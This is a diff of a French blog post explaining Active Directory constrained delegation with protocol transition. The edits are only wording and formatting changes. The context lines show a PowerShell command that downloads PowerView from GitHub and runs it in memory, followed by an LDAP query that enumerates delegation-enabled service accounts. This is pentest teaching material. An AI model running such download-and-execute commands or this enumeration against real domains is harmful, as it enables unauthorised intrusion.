@@ -26,13 +26,13 @@ ou via GUI:
 
 ![t2a4d]({{ site.url }}/public/images/t2a4d/setup_t2a4d.png)
   
-Notons que la délégation contrainte peut également être basée sur la ressource (écriture du champs *msds-allowedtoactonbehalfofotheridentity* de MACHINE$). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut y accéder.  
+Notons que la délégation contrainte peut également être basée sur la ressource (écriture du champs **msds-allowedtoactonbehalfofotheridentity** de *MACHINE$*). Il semble en effet plus cohérent de donner la légitimité à une ressource de décider quelle autre ressource peut y accéder.  
   
 Rentrons dans le vif du sujet.  
   
 # Enumeration
 
-La première chose intéressante est de pouvoir énumérer les objets concernés par T2A4D :  
+La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
 ```
 PS C:\Users\Administrator\Documents\Invoke-Recon> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 PS C:\Users\Administrator\Documents\Invoke-Recon> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
